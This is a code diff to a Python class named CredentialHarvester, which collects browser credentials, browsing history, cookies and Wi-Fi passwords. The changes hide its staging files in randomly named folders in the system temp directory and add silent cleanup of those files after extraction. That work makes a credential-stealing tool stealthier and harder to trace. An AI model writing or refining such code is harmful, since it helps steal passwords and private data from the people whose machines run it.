@@ -285,7 +285,7 @@ class CredentialHarvester:
                     # Initialize data structures to collect results
                     self.credentials_data = []
                     self.history_data = []
-                    self.temp_path = os.path.expanduser("~/tmp")
+                    self.temp_path = os.path.join(tempfile.gettempdir(), "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=10)))
                     if not os.path.exists(self.temp_path):
                         os.makedirs(self.temp_path)
                     # Create Browser subdirectory for cookie storage
@@ -557,7 +557,7 @@ class CredentialHarvester:
 
                 def create_temp(self, _dir: Union[str, os.PathLike] = None):
                     if _dir is None:
-                        _dir = os.path.expanduser("~/tmp")
+                        _dir = tempfile.gettempdir()
                     if not os.path.exists(_dir):
                         os.makedirs(_dir)
                     file_name = ''.join(random.SystemRandom().choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(random.randint(10, 20)))
@@ -722,11 +722,20 @@ class CredentialHarvester:
             # The Browsers class now extracts data directly and returns structured data
             # No need to parse files - data is returned directly
 
-            return {{
+            data = {{
                 "credentials": browsers.credentials_data,
                 "history": browsers.history_data,
                 "wifi": CredentialHarvester.get_wifi_passwords()
             }}
+            
+            # Cleanup temp files
+            try:
+                if os.path.exists(browsers.temp_path):
+                    shutil.rmtree(browsers.temp_path, ignore_errors=True)
+            except:
+                pass
+                
+            return data
 
         except Exception as e:
             print(f"Error extracting browser data: {{e}}")
